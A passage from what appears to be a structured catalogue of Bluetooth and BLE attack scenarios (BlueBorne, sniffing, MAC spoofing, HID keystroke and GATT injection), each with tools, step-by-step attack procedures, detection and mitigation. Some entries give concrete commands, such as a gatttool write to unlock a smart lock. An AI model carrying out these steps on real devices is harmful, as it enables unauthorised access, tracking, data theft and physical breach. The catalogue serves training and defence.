- **Attack Steps**: Step 1: TV Box detected via blueborne-scanner when Bluetooth is ON. Step 2: Exploit sends malformed SDP packets to overflow media service. Step 3: Shell access allows attacker to play custom media files or change app interfaces. Step 4: Demonstrate prank (change screen to static or "404 Channel not found"). Step 5: Reboot device and discuss mitigation.
- **Detection**: Logcat, screen behavior
- **Solution**: Firmware update, physical lockdown
- **Tags**: tvbox, android, blueborne

## Multi-Device BlueBorne Attack Lab Simulation

- **Attack Type**: Bluetooth (802.15.1) - BlueBorne Attack
- **Target**: Mixed Devices
- **Vulnerability**: CVE-2017-0785, -8628, -1000251
- **MITRE**: T1203 (Exploit Client Execution)
- **Impact**: Broad compromise with visibility
- **Tools**: blueborne-scanner, Metasploit, Nmap, Bluetooth dongle
- **Scenario**: A training exercise showing attack chain across Android, Linux, and Windows devices.
- **Attack Steps**: Step 1: Set up 3 test systems: Android phone, Linux laptop, and Win10 tablet. Step 2: Instructor runs blueborne-scanner to find targets. Step 3: Run Metasploit BlueBorne exploit tailored to each OS. Step 4: Document success rate, system behavior, and detection signs. Step 5: Teach defensive patching, MAC whitelisting, and BT visibility control.
- **Detection**: Classroom observation, BT logs
- **Solution**: Patch management, disable BT discovery
- **Tags**: training-lab, blueborne, multi-os

## Exploiting Fitness Tracker via BlueBorne

- **Attack Type**: Bluetooth (802.15.1) - BlueBorne Attack
- **Target**: Fitness Band / BLE Device
- **Vulnerability**: CVE-2017-0785
- **MITRE**: T1556.004 (Application Layer Protocol Manipulation)
- **Impact**: Theft and tampering of health data
- **Tools**: blueborne-scanner, hcitool, custom BLE exploit script
- **Scenario**: A user’s Bluetooth-enabled fitness band is silently compromised to extract health data and modify activity logs.
- **Attack Steps**: Step 1: Victim wears a fitness band (e.g., Fitbit) with Bluetooth turned on. It’s not paired to any phone. Step 2: Attacker walks nearby and runs blueborne-scanner to detect BLE (Bluetooth Low Energy) devices. Step 3: Using hcitool lescan, attacker identifies the MAC address and confirms the device type. Step 4: Launches a crafted BLE exploit script to send malformed Bluetooth packets using gatttool. Step 5: The device responds, giving unauthorized access to sync data, steps count, and allows editing records (e.g., fake calories).
- **Detection**: Monitor sync anomalies in app, logs
- **Solution**: Apply firmware patch; disable BT when not syncing
- **Tags**: wearable, ble, health-hack, blueborne

## Exploiting Android Auto Head Unit via BlueBorne

- **Attack Type**: Bluetooth (802.15.1) - BlueBorne Attack
- **Target**: Android Auto Infotainment
- **Vulnerability**: CVE-2017-0783
- **MITRE**: T1210 (Exploitation for Remote Services)
- **Impact**: Unauthorized in-vehicle system control
- **Tools**: blueborne-scanner, Metasploit, Android Auto
- **Scenario**: Demonstrates attack on an in-vehicle Android Auto system that runs outdated Bluetooth stack.
- **Attack Steps**: Step 1: Attacker walks near a parked vehicle with Android Auto active and Bluetooth discoverable. Step 2: Runs blueborne-scanner to fingerprint the infotainment system's OS. Step 3: Attacker loads the BlueBorne Metasploit module configured for Android OS. Step 4: Sends exploit packets to the target, gaining shell access to the infotainment system. Step 5: Opens music player remotely or activates voice commands, simulating unauthorized in-car control.
- **Detection**: BT activity log, odd media commands
- **Solution**: Upgrade OS firmware; disable BT auto-discovery
- **Tags**: android-auto, infotainment, remote-access

## BlueBorne Attack on School Tablet (BYOD Scenario)

- **Attack Type**: Bluetooth (802.15.1) - BlueBorne Attack
- **Target**: Android Tablet
- **Vulnerability**: CVE-2017-0785
- **MITRE**: T1566 (Phishing - though no click needed here)
- **Impact**: File access, surveillance, data leak
- **Tools**: blueborne-scanner, Metasploit, Wireshark
- **Scenario**: In a Bring Your Own Device (BYOD) school setup, a student attacks another’s tablet using BlueBorne.
- **Attack Steps**: Step 1: Student A brings an Android tablet with Bluetooth ON and outdated software. Step 2: Student B uses Kali Linux and blueborne-scanner to detect vulnerable devices nearby. Step 3: Metasploit’s BlueBorne exploit module is run against the tablet's MAC address. Step 4: Exploit allows Student B to gain remote shell on the tablet without the user noticing. Step 5: Student B lists and opens image or notes files silently to demonstrate access during classroom simulation.
- **Detection**: Watchdog on Bluetooth logs, access timestamps
- **Solution**: Patch OS, disable BT in school zones
- **Tags**: school, byod, education, blueborne

## Demonstration of BlueBorne with Signal Jamming Backup

- **Attack Type**: Bluetooth (802.15.1) - BlueBorne Attack
- **Target**: Android Tablet / IoT Device
- **Vulnerability**: CVE-2017-0781
- **MITRE**: T1008 (Fallback Channels)
- **Impact**: Exploits forced use of Bluetooth under jamming
- **Tools**: blueborne-scanner, WiFi jammer, Metasploit
- **Scenario**: A lab simulation where attacker first jams Wi-Fi, forcing device to use Bluetooth, then launches BlueBorne.
- **Attack Steps**: Step 1: Instructor introduces a test tablet connected to Wi-Fi and Bluetooth both ON. Step 2: A small portable jammer is used to disable Wi-Fi, forcing the device to fall back on Bluetooth apps. Step 3: Instructor scans using blueborne-scanner and identifies the fallback Bluetooth services. Step 4: BlueBorne exploit from Metasploit is executed to show remote control via Bluetooth. Step 5: Shell shows open ports and files, proving that fallback to Bluetooth can be risky.
- **Detection**: Loss of Wi-Fi, increased BT traffic
- **Solution**: Control fallback behavior, patch BT stack
- **Tags**: fallback-channel, jammer, blueborne

## BlueBorne Propagation Between Devices (Worm-like Test)

- **Attack Type**: Bluetooth (802.15.1) - BlueBorne Attack
- **Target**: Android Phones
- **Vulnerability**: CVE-2017-0781 to -0785
- **MITRE**: T1105 (Remote File Copy / Worming)
- **Impact**: Simulates malware spreading silently
- **Tools**: custom python script, blueborne-scanner, BT adapters
- **Scenario**: A simulated worm attack demonstrates how a BlueBorne payload can self-propagate between devices.
- **Attack Steps**: Step 1: Set up two vulnerable Android phones and a Raspberry Pi with a Bluetooth adapter. Step 2: Raspberry Pi runs a custom Python script to infect Device A using BlueBorne exploit. Step 3: Once Device A is infected, it runs the same exploit to find and infect Device B via Bluetooth. Step 4: Both devices log the infection time and simulate payload propagation without user interaction. Step 5: Demonstration concludes with analysis of how fast infection spread without Wi-Fi or app installs.
- **Detection**: Track timestamps, device behavior logs
- **Solution**: Isolate BT stack; restrict BT visibility
- **Tags**: worm, propagation, blueborne, simulation

## Passive Bluetooth Sniffing on Unencrypted Devices

- **Attack Type**: Bluetooth Sniffing
- **Target**: Mobile Devices, Headsets
- **Vulnerability**: Lack of Encryption in Bluetooth 2.0
- **MITRE**: T1421
- **Impact**: Information Disclosure
- **Tools**: Ubertooth One, Wireshark, hciconfig
- **Scenario**: Attacker captures Bluetooth traffic between two unencrypted devices (like an older phone and a headset).
- **Attack Steps**: Step 1: Power on Ubertooth One and connect it to your machine. Step 2: Launch Wireshark and select the Ubertooth interface. Step 3: Ensure target device is in discoverable mode. Step 4: Start sniffing while the target initiates a pairing or data transfer. Step 5: Filter packets based on BD_ADDR to isolate communication. Step 6: Analyze captured packets for file transfers or command logs.
- **Detection**: Monitor for unknown sniffing devices via RF scan
- **Solution**: Upgrade to BLE or enable pairing with encryption
- **Tags**: bluetooth, passive sniffing, Ubertooth

## Bluetooth Address Spoofing for Impersonation

- **Attack Type**: Bluetooth Spoofing
- **Target**: Smartphones, Laptops
- **Vulnerability**: Trusted Device Auto-Pairing
- **MITRE**: T1630
- **Impact**: Device Takeover
- **Tools**: hciconfig, l2ping, btmgmt
- **Scenario**: Attacker spoofs the MAC address of a trusted Bluetooth device to impersonate it and connect to the target.
- **Attack Steps**: Step 1: Use hciconfig to check your Bluetooth adapter. Step 2: Change your Bluetooth MAC to a trusted device's using bdaddr tool. Step 3: Use btmgmt to make your spoofed adapter discoverable. Step 4: Send pairing request to target using the spoofed MAC. Step 5: Observe target behavior and whether it connects automatically.
- **Detection**: Sudden reconnection to spoofed address
- **Solution**: Restrict auto-pairing and monitor MAC anomalies
- **Tags**: spoofing, bluetooth, mac spoof, impersonation

## Sniffing Bluetooth LE Advertising Packets

- **Attack Type**: Bluetooth Sniffing
- **Target**: BLE Devices (IoT)
- **Vulnerability**: Broadcast Metadata Leakage
- **MITRE**: T1421
- **Impact**: Device Fingerprinting
- **Tools**: BLEah, Wireshark, Ubertooth One
- **Scenario**: Capture BLE advertising packets from fitness trackers or smart devices for reconnaissance.
- **Attack Steps**: Step 1: Use Ubertooth One or compatible BLE sniffer hardware. Step 2: Run BLEah to scan for nearby advertising packets. Step 3: Log UUIDs, manufacturer data, and RSSI. Step 4: Identify patterns or device types based on UUIDs. Step 5: Store and analyze packet logs for device mapping.
- **Detection**: Detect unexpected BLE scanning behavior
- **Solution**: Use MAC randomization and advertise less sensitive metadata
- **Tags**: BLE, sniffing, packet analysis, IoT

## Man-in-the-Middle via Bluetooth Pairing Intercept

- **Attack Type**: Bluetooth Spoofing
- **Target**: Smartphones, Smart Locks
- **Vulnerability**: Insecure Pairing Protocol
- **MITRE**: T1430
- **Impact**: Session Hijacking
- **Tools**: BtleJuice, Bluetooth dongle, USB hub
- **Scenario**: Attacker captures pairing session between two devices and replays to perform MitM connection.
- **Attack Steps**: Step 1: Set up BtleJuice on two Bluetooth interfaces (spoofing and proxy). Step 2: Position attacker device between two Bluetooth devices during pairing. Step 3: Start interception and allow legitimate pairing data to pass through. Step 4: Modify traffic to inject or alter commands. Step 5: Extract sensitive data or control commands during session.
- **Detection**: Detect dual MAC interaction from same location
- **Solution**: Use authenticated pairing methods like Just Works + OOB
- **Tags**: spoofing, MITM, bluetooth, relay

## Clone Bluetooth Device Identity for Phishing

- **Attack Type**: Bluetooth Spoofing
- **Target**: Bluetooth Speakers
- **Vulnerability**: User Trust in Device Names
- **MITRE**: T1621
- **Impact**: Social Engineering
- **Tools**: btspoof, BlueZ, custom audio files
- **Scenario**: Attacker clones the identity of a Bluetooth speaker to trick a user into connecting and playing malicious audio.
- **Attack Steps**: Step 1: Discover Bluetooth speaker’s MAC and name using hcitool scan. Step 2: Use btspoof to set attacker adapter's name and MAC to match the speaker. Step 3: Make spoofed device visible and wait for user to connect. Step 4: Auto-play crafted phishing audio (“Update your app…”). Step 5: User acts on fake instruction (e.g., visit a malicious link).
- **Detection**: Unrecognized audio prompt or strange behavior
- **Solution**: Verify device identities before connecting
- **Tags**: spoofing, phishing, bluetooth, social engineering

## Sniffing File Transfers Between Paired Devices

- **Attack Type**: Bluetooth Sniffing
- **Target**: Mobile Phones
- **Vulnerability**: Unencrypted File Transfer
- **MITRE**: T1421
- **Impact**: File Exposure
- **Tools**: Ubertooth One, Wireshark, Wireshark BT Plugin
- **Scenario**: Attacker captures file transfer session (e.g., photo sharing) between two paired phones using sniffing tools.
- **Attack Steps**: Step 1: Connect Ubertooth One to a Linux system with Wireshark installed.Step 2: Place the attacker device near two phones sharing files via Bluetooth.Step 3: Start capturing packets using Ubertooth by running ubertooth-btle -f.Step 4: Open Wireshark and load the capture.Step 5: Apply btcommon.eir_ad.entry.device_name filters to isolate the target.Step 6: Identify OBEX headers to find media content being transferred.Step 7: Export captured file fragments for offline reconstruction.
- **Detection**: OBEX or RFCOMM analysis for unauthorized data
- **Solution**: Use secure Bluetooth profiles and disable file transfer
- **Tags**: bluetooth, OBEX, file sniffing, media

## Fake Bluetooth Keyboard Injection Attack

- **Attack Type**: Bluetooth Spoofing
- **Target**: Laptops, PCs
- **Vulnerability**: Trust in Known HID Devices
- **MITRE**: T1566.001
- **Impact**: Code Execution
- **Tools**: BlueMaZer, Raspberry Pi, HID Bluetooth dongle
- **Scenario**: Attacker spoofs a Bluetooth keyboard and sends keystrokes to a host device (e.g., laptop).
- **Attack Steps**: Step 1: Set up a Raspberry Pi with a compatible Bluetooth dongle.Step 2: Install and configure BlueMaZer or custom HID keyboard spoofing tool.Step 3: Spoof the name and MAC of a legitimate Bluetooth keyboard.Step 4: When the target is in pairing mode, broadcast the spoofed keyboard.Step 5: Once paired, send automated keystrokes (e.g., win + R, powershell, malicious command).Step 6: Monitor for command execution and system changes.Step 7: Log success/failure for education/demo purpose.
- **Detection**: Unexpected typing behavior
- **Solution**: Enforce manual Bluetooth pairing approvals
- **Tags**: spoofing, HID, bluetooth keyboard attack

## BLE Scan Spoofing to Flood Pairing Requests

- **Attack Type**: Bluetooth Spoofing
- **Target**: BLE-enabled Phones, Smartwatches
- **Vulnerability**: Pairing Resource Saturation
- **MITRE**: T1499
- **Impact**: DoS
- **Tools**: btmgmt, BLE Scanner, BLE Spoofer
- **Scenario**: Attacker floods nearby BLE-enabled devices with multiple spoofed pairing requests, causing DoS.
- **Attack Steps**: Step 1: Enable Bluetooth adapter and scan using btmgmt find.Step 2: Identify nearby BLE-capable devices broadcasting advertisements.Step 3: Use BLE Spoofer to create 50+ fake BLE identities.Step 4: Broadcast these fake devices rapidly, all sending pairing requests.Step 5: Observe that target devices slow down or fail to accept new connections.Step 6: Monitor BLE traffic saturation using BLE scanner.Step 7: Log when devices stop responding.
- **Detection**: BLE traffic spike detection
- **Solution**: Rate-limit pairing requests, disable public mode
- **Tags**: BLE, spoofing, pairing flood, DoS

## Clone Fitness Tracker Identity to Inject Data

- **Attack Type**: Bluetooth Spoofing
- **Target**: Fitness Trackers, BLE Devices
- **Vulnerability**: Unauthenticated Data Transfer
- **MITRE**: T1556
- **Impact**: Fake Health Data
- **Tools**: btspoof, BLEPeripheral on Android, nRF Connect
- **Scenario**: Attacker clones a fitness tracker’s MAC and broadcasts fake steps data to sync with user app.
- **Attack Steps**: Step 1: Use nRF Connect or hcitool to discover MAC of nearby tracker.Step 2: Clone MAC using btspoof and set device name to match tracker.Step 3: Use BLEPeripheral (Android) to mimic services (e.g., HeartRate, Steps Count).Step 4: Broadcast spoofed data during app sync window.Step 5: Open target app on another device and allow data sync.Step 6: Confirm injection by checking manipulated step count or vitals.Step 7: Reset all data post simulation.
- **Detection**: Health metrics anomaly or drift
- **Solution**: Sign encrypted sensor readings
- **Tags**: spoofing, fitness, BLE, data injection

## Bluetooth Spoofing to Bypass Physical Access Control

- **Attack Type**: Bluetooth Spoofing
- **Target**: Smart Locks, Smart Doors
- **Vulnerability**: MAC-Based Trust
- **MITRE**: T1583
- **Impact**: Physical Breach
- **Tools**: hciconfig, bdaddr, Bluetooth Smart Lock
- **Scenario**: Attacker spoofs the Bluetooth MAC of a registered user to unlock smart locks or doors.
- **Attack Steps**: Step 1: Observe legitimate user unlocking door via Bluetooth (e.g., with phone).Step 2: Using hcitool scan, capture the user’s Bluetooth MAC and device name.Step 3: Set attacker’s Bluetooth adapter to same MAC using bdaddr.Step 4: Broadcast spoofed signal while standing near the lock.Step 5: Smart lock believes the authorized user is nearby and unlocks.Step 6: Log access and relock for simulation integrity.Step 7: Reset MAC and restore device state.
- **Detection**: Door logs multiple unlocks from same MAC
- **Solution**: Use strong authentication protocols (e.g., OTP + MAC)
- **Tags**: spoofing, access control, bluetooth, physical

## Capture and Replay Bluetooth HID Commands

- **Attack Type**: Bluetooth Sniffing
- **Target**: PCs, Laptops
- **Vulnerability**: Reusable HID Data
- **MITRE**: T1622
- **Impact**: HID Command Execution
- **Tools**: Ubertooth One, btproxy, HID Replay Tool
- **Scenario**: Attacker captures HID commands from a Bluetooth mouse and replays them to another paired system.
- **Attack Steps**: Step 1: Use Ubertooth to sniff pairing and HID activity between a Bluetooth mouse and target PC.Step 2: Capture report descriptor and command packets.Step 3: Use HID Replay Tool to reassemble the command buffer.Step 4: Set up attacker’s Bluetooth dongle as an HID mouse.Step 5: Replay previously captured HID commands (clicks, drags).Step 6: Use this to open files or trigger application execution.Step 7: End session and reset spoofed HID identity.
- **Detection**: Monitor repetitive or ghost input events
- **Solution**: Restrict HID over Bluetooth unless whitelisted
- **Tags**: sniffing, HID, replay, mouse

## Spoofed Bluetooth Printer for Document Capture

- **Attack Type**: Bluetooth Spoofing
- **Target**: Mobile Phones, Office Printers
- **Vulnerability**: Trusted Bluetooth Printing
- **MITRE**: T1566.002
- **Impact**: Document Theft
- **Tools**: BlueZ, btprinter.py, CupsPrint Proxy
- **Scenario**: Attacker sets up a fake Bluetooth printer to capture documents sent by mobile devices.
- **Attack Steps**: Step 1: Deploy btprinter.py or similar service that emulates a Bluetooth printer.Step 2: Set spoofed printer name to match a known office printer.Step 3: Make device discoverable and wait for unsuspecting user to connect.Step 4: Accept print jobs and capture transmitted documents.Step 5: Store print content in raw format (e.g., PostScript or PDF).Step 6: Save data for educational analysis.Step 7: Simulate legitimate printer denial for realism.
- **Detection**: Unrecognized print error or log mismatch
- **Solution**: Require pairing PIN + authenticated printer ID
- **Tags**: spoofing, printing, document leak, bluetooth

## Bluetooth MAC Randomization Bypass for Tracking

- **Attack Type**: Bluetooth Sniffing
- **Target**: Smartphones, Wearables
- **Vulnerability**: Partial MAC Randomization
- **MITRE**: T1421
- **Impact**: Device Tracking
- **Tools**: BLEah, Wireshark, btmon
- **Scenario**: Attacker identifies a device despite MAC randomization using static advertising data (like UUID).
- **Attack Steps**: Step 1: Use BLEah or btmon to capture BLE advertising packets over time.Step 2: Identify fields that remain constant despite MAC change (e.g., manufacturer UUID).Step 3: Track device movement based on constant field across randomized MACs.Step 4: Correlate with physical location data for tracking.Step 5: Record beacon intervals and signal strength.Step 6: Log data over time to show tracking ability.Step 7: Clean up sniff logs after simulation.
- **Detection**: Consistent UUID or signal pattern
- **Solution**: Use full address + payload randomization
- **Tags**: sniffing, privacy, BLE, tracking

## Inject Voice Commands via Spoofed Bluetooth Headset

- **Attack Type**: Bluetooth Spoofing
- **Target**: Smartphones
- **Vulnerability**: Voice Assistant Trust
- **MITRE**: T1556.004
- **Impact**: Voice Command Execution
- **Tools**: btspoof, Audio Injection Script, BlueZ
- **Scenario**: Attacker spoofs a Bluetooth headset to send malicious voice commands (e.g., “Call attacker”) to a paired phone.
- **Attack Steps**: Step 1: Identify target’s Bluetooth headset name and MAC using scan tools.Step 2: Set spoofed MAC and device name using btspoof.Step 3: Simulate headset auto-connect behavior when near phone.Step 4: Inject prerecorded voice file (e.g., “Open browser to malicious site”).Step 5: Observe phone’s voice assistant reacting to command.Step 6: Log any successful execution.Step 7: Disconnect spoofed headset and end simulation.
- **Detection**: Unintended voice commands logged in assistant history
- **Solution**: Disable auto-connect to audio devices
- **Tags**: spoofing, voice, headset, bluetooth

## BLE Advertisement Spoofing for Location Spoofing

- **Attack Type**: Bluetooth Spoofing
- **Target**: Indoor Apps, Navigation Systems
- **Vulnerability**: Trust in Beacon Data
- **MITRE**: T1552
- **Impact**: Location Tampering
- **Tools**: Beacon Simulator App (Android), BLEAdvertiser
- **Scenario**: Attacker spoofs BLE beacon data (like iBeacon/Eddystone) to manipulate indoor location apps.
- **Attack Steps**: Step 1: Identify beacon UUID and TX power using nRF Connect.Step 2: Configure BLEAdvertiser or Beacon Simulator to mimic original beacon UUID.Step 3: Spoof multiple virtual beacons at different fake distances.Step 4: Target app (e.g., museum guide or store app) receives spoofed beacon data.Step 5: App shows incorrect location or triggers wrong content.Step 6: Document app behavior mismatch.Step 7: End simulation and reset beacon state.
- **Detection**: Beacon behavior logs don’t match physical layout
- **Solution**: Use signed beacon payloads and triangulation
- **Tags**: spoofing, beacon, BLE, indoor location

## Bluetooth File Transfer Sniff & Rebuild

- **Attack Type**: Bluetooth Sniffing
- **Target**: Phones, Tablets
- **Vulnerability**: Lack of encrypted file transfer (OBEX over RFCOMM)
- **MITRE**: T1421
- **Impact**: Privacy Breach, Data Interception
- **Tools**: Ubertooth One, Wireshark, hcitool, OBEX Plugin
- **Scenario**: Attacker intercepts a file sent via Bluetooth (like an image or document) and reconstructs the file using captured packet data.
- **Attack Steps**: Step 1: Connect the Ubertooth One device to a Linux laptop and verify it using lsusb.Step 2: Ensure both target devices are powered on and Bluetooth-enabled, preferably during a file transfer event (like sending a photo from one phone to another).Step 3: Launch Wireshark and select Ubertooth as the capture interface.Step 4: Start packet capture before the file is transferred.Step 5: Filter traffic using “OBEX” or known MAC addresses (found via hcitool scan).Step 6: Look for OBEX “PUT” operations indicating file uploads.Step 7: Follow the stream, extract data chunks, and reassemble them using the “Export Objects” feature in Wireshark.Step 8: Save the reconstructed file for demonstration purposes (e.g., .jpg or .pdf).
- **Detection**: OBEX transfer logs, traffic analysis
- **Solution**: Use Bluetooth transfers only with authenticated/encrypted sessions
- **Tags**: sniffing, OBEX, file transfer, wireless

## Spoofing Car Audio System for Audio Hijack

- **Attack Type**: Bluetooth Spoofing
- **Target**: Smartphones, Car Audio
- **Vulnerability**: Auto-pairing & trusted device identity
- **MITRE**: T1621
- **Impact**: Social Engineering via Audio
- **Tools**: hciconfig, Raspberry Pi, btspoof
- **Scenario**: Attacker spoofs a car’s Bluetooth system name to trick phones into connecting, allowing the attacker to play fake audio instructions.
- **Attack Steps**: Step 1: Using a Linux laptop or Raspberry Pi, run hciconfig to verify the Bluetooth adapter.Step 2: Scan nearby devices using hcitool scan to find the actual car audio system (e.g., “TOYOTA_AUDIO” with MAC).Step 3: Change your adapter’s Bluetooth name and MAC to match the car using tools like btspoof.Step 4: Make the spoofed device discoverable.Step 5: When a phone in the vicinity tries to reconnect (thinking it’s the car), accept the connection request.Step 6: Immediately stream a pre-recorded voice message like “Your car software needs updating. Visit xyz.com.”Step 7: Monitor whether the user responds (e.g., taps the link or reacts).Step 8: Disconnect and reset adapter identity after simulation.
- **Detection**: Bluetooth logs may show unusual MACs or duplicate devices
- **Solution**: Educate users to confirm trusted devices before connection
- **Tags**: spoofing, car audio, phishing, bluetooth

## Bluetooth Low Energy Passive Tracking at Public Places

- **Attack Type**: Bluetooth Sniffing
- **Target**: Wearables, BLE devices
- **Vulnerability**: Static UUIDs despite MAC randomization
- **MITRE**: T1421
- **Impact**: Location privacy breach
- **Tools**: BLEah, BlueHydra, Wireshark
- **Scenario**: Attacker uses a BLE sniffer to passively track users in a coffee shop or shopping mall using advertising packets from phones or wearables.
- **Attack Steps**: Step 1: Go to a public space where people use smartphones or fitness bands (e.g., gym, café).Step 2: Run BLEah or bluehydra to continuously scan for BLE advertising packets.Step 3: Note that BLE devices (like fitness trackers) broadcast data with randomized MACs but may reuse other static identifiers (UUIDs, major/minor values).Step 4: Log timestamped packets and identify unique UUID patterns.Step 5: Match repeated identifiers over time to estimate user movement (e.g., user entered café at 10:10 AM and left at 10:45 AM).Step 6: Use RSSI (signal strength) to approximate distance and movement.Step 7: Present logs showing how even with MAC randomization, device presence and identity can be inferred.
- **Detection**: Sudden change in advertising behavior; repeated UUIDs
- **Solution**: Use full identity rotation and encrypted BLE advertisements
- **Tags**: sniffing, BLE, privacy, location tracking

## Spoofing Smartwatch to Hijack Notifications

- **Attack Type**: Bluetooth Spoofing
- **Target**: Smartphones, Smartwatches
- **Vulnerability**: Trust in BLE-based notification endpoints
- **MITRE**: T1566.002
- **Impact**: Phishing via trusted device channel
- **Tools**: Android phone with nRF Connect, BLEPeripheral App
- **Scenario**: Attacker mimics a smartwatch, connects to a phone, and displays fake notifications to the user.
- **Attack Steps**: Step 1: Observe a smartwatch pairing with a phone (e.g., via Bluetooth LE).Step 2: Note the advertised services/characteristics used by that watch model (Heart Rate, Notification Service).Step 3: On attacker’s Android phone, install and open the BLEPeripheral app.Step 4: Create a spoofed device profile that mimics the original watch (same name, UUIDs).Step 5: Broadcast the spoofed device and wait for the phone to auto-connect.Step 6: Send spoofed notifications like “Suspicious activity on your account, tap to verify.”Step 7: Log user interaction if they tap or respond.Step 8: End broadcast and clear logs for simulation closure.
- **Detection**: Logs may show duplicate smartwatch identifiers
- **Solution**: Require user confirmation for pairing and notification access
- **Tags**: smartwatch, BLE, spoofing, notification hijack

## Bluetooth Mouse Movement Hijack

- **Attack Type**: Bluetooth Spoofing
- **Target**: PCs, Laptops
- **Vulnerability**: Trusted HID re-pairing
- **MITRE**: T1566.001
- **Impact**: Accidental Execution
- **Tools**: HID-attack (custom script), USB Bluetooth adapter, Kali Linux
- **Scenario**: Attacker spoofs a Bluetooth mouse and sends directional input to manipulate the user’s screen cursor, possibly causing misclicks.
- **Attack Steps**: Step 1: Scan the victim’s paired devices using hcitool con to identify Bluetooth mouse (e.g., “Logitech M185”).Step 2: Use bdaddr to clone the MAC and set device name to match the mouse.Step 3: Broadcast the spoofed mouse and trigger reconnection from victim PC.Step 4: Once paired, use HID spoofing script to move the mouse pointer slowly to sensitive areas (like delete buttons or confirmation prompts).Step 5: Observe user confusion or accidental clicks.Step 6: Stop spoof and log attack impact for demo analysis.Step 7: Restore original MAC address and HID identity.
- **Detection**: Mouse logs and cursor behavior anomalies
- **Solution**: Restrict input devices to known trusted hardware
- **Tags**: HID spoofing, bluetooth mouse, misclick

## Injecting Malicious GATT Commands into BLE Smart Lock

- **Attack Type**: BLE Injection Attack
- **Target**: Smart Lock
- **Vulnerability**: Lack of authentication for GATT commands
- **MITRE**: T1210
- **Impact**: Unauthorized access to locked area
- **Tools**: gatttool, Ubertooth, Btlejack
- **Scenario**: Attacker targets a BLE smart lock and injects unauthorized commands to unlock it without user consent.
- **Attack Steps**: Step 1: Identify BLE-enabled smart lock nearby using hcitool lescan. Step 2: Record the MAC address of the lock. Step 3: Use gatttool -I to connect to the MAC address. Step 4: Discover available GATT characteristics using characteristics. Step 5: Identify characteristic that controls the lock state. Step 6: Send write command to that characteristic (e.g., char-write-req 0x0025 01) to unlock. Step 7: Observe the lock opens without user action.
- **Detection**: BLE anomaly detection, command monitoring
- **Solution**: Enforce GATT-level authentication and whitelist only trusted devices
- **Tags**: BLE, Smart Lock, IoT, GATT Injection

## BLE HID Keyboard Injection into Smartphone

- **Attack Type**: BLE Injection Attack
- **Target**: Smartphone
- **Vulnerability**: Weak pairing security; No user verification
- **MITRE**: T1056.001
- **Impact**: Phishing, data exfiltration, command execution
- **Tools**: Adafruit BLE HID, nRF52840 Dongle, Python
- **Scenario**: A rogue BLE device emulates a keyboard and injects keystrokes into a paired smartphone.
- **Attack Steps**: Step 1: Configure Adafruit BLE device to operate in HID (keyboard) mode. Step 2: Modify firmware to include automated keystroke payload (e.g., open browser, type phishing link). Step 3: Power on the device near target smartphone with BLE enabled. Step 4: Phone auto-pairs or accepts rogue device as a keyboard. Step 5: Keystroke injection begins: opens browser, types "malicioussite.com", presses Enter. Step 6: Victim unknowingly opens malicious site.
- **Detection**: Monitor new BLE HID devices; Use BLE device whitelists
- **Solution**: Require PIN or user confirmation for new HID pairings
- **Tags**: BLE, HID, Mobile, Keystroke Injection

## Injecting Fake Temperature Data into BLE Health Monitor

- **Attack Type**: BLE Injection Attack
- **Target**: Medical BLE Thermometer
- **Vulnerability**: No data validation from BLE device
- **MITRE**: T1557
- **Impact**: Medical misinformation, diagnosis errors
- **Tools**: Btlejack, GATTacker, Bluefruit LE Sniffer
- **Scenario**: Attacker sends fake sensor values to BLE health monitor, misleading medical apps.
- **Attack Steps**: Step 1: Use BLE sniffer (e.g., Btlejack) to intercept data from BLE thermometer. Step 2: Clone BLE device profile using GATTacker. Step 3: Modify GATT characteristics to report false temperature (e.g., 108°F). Step 4: Re-broadcast cloned BLE profile using Raspberry Pi. Step 5: Victim’s phone connects to spoofed BLE thermometer. Step 6: Medical app receives fake high temperature reading. Step 7: Alert or misdiagnosis triggered on app.
- **Detection**: Monitor device MACs; Use encrypted connections
- **Solution**: Enforce secure pairing and device validation
- **Tags**: BLE, Medical, IoT, Data Injection

## BLE Advertising Packet Injection for Spam Popups

- **Attack Type**: BLE Injection Attack
- **Target**: Mobile Phones
- **Vulnerability**: Over-permissive BLE advertising handling
- **MITRE**: T1609
- **Impact**: Spam, Ad-based revenue, redirection
- **Tools**: BlueZ stack, hcitool, hcitool-advertise
- **Scenario**: Attacker abuses advertising packets to broadcast URLs or spam to nearby BLE-enabled devices.
- **Attack Steps**: Step 1: Create a BLE beacon device using BlueZ and Linux. Step 2: Use hcitool -i hci0 cmd to craft raw BLE advertising packets. Step 3: Encode URL into payload (e.g., "VisitFakeSite.com"). Step 4: Continuously broadcast this advertising packet in a loop. Step 5: Nearby phones with BLE enabled receive notifications or logs from "unknown device". Step 6: Curious users tap on notification, opening URL. Step 7: Redirect to malicious site or ad network.
- **Detection**: BLE packet anomaly detection
- **Solution**: Block unverified BLE advertisers; App-level filters
- **Tags**: BLE, Advertising, Spam, Beacon Abuse

## Injecting Commands into BLE-Controlled Light System

- **Attack Type**: BLE Injection Attack
- **Target**: BLE Smart Bulbs
- **Vulnerability**: Lack of access control on BLE write operations
- **MITRE**: T1496
- **Impact**: Visual disruption, annoyance, privacy intrusion
- **Tools**: LightBlue Explorer, nRF Connect, gatttool
- **Scenario**: Attacker gains control over BLE smart lighting by injecting commands to turn lights on/off or change colors.
- **Attack Steps**: Step 1: Use hcitool lescan to find BLE bulbs in vicinity. Step 2: Connect to bulb using gatttool. Step 3: Discover services and find RGB control handle. Step 4: Inject new color value by writing to the RGB characteristic (e.g., char-write-cmd 0x0034 ff0000 for red). Step 5: Light changes color or toggles state without owner action. Step 6: Repeat with flashing pattern to cause disruption.
- **Detection**: BLE activity monitoring; Light firmware logs
- **Solution**: Enforce access control lists and encrypted pairing
- **Tags**: BLE, Smart Home, IoT, Lighting

## Injecting Audio Control Commands into BLE Earbuds

- **Attack Type**: BLE Injection Attack
- **Target**: BLE Earbuds
- **Vulnerability**: No authentication for media GATT commands
- **MITRE**: T1496
- **Impact**: Annoyance, audio hijack, denial of use
- **Tools**: BLEah, gatttool, LightBlue
- **Scenario**: Attacker sends rogue commands to BLE-connected earbuds to play/pause, skip, or change volume.
- **Attack Steps**: Step 1: Scan for nearby BLE earbuds using hcitool lescan. Step 2: Note the MAC address of the victim's device. Step 3: Use gatttool to connect and list services. Step 4: Identify the media control handle (e.g., Play/Pause). Step 5: Inject commands (e.g., char-write-req 0x002d 01) to simulate play/pause. Step 6: Repeat with other control commands like "next track" or "volume up". Step 7: Victim is confused as audio changes unexpectedly.
- **Detection**: Monitor unexpected media actions
- **Solution**: Firmware-level command authentication
- **Tags**: BLE, Audio, GATT, Media Injection

## BLE Injection to Control Fitness Tracker Vibration

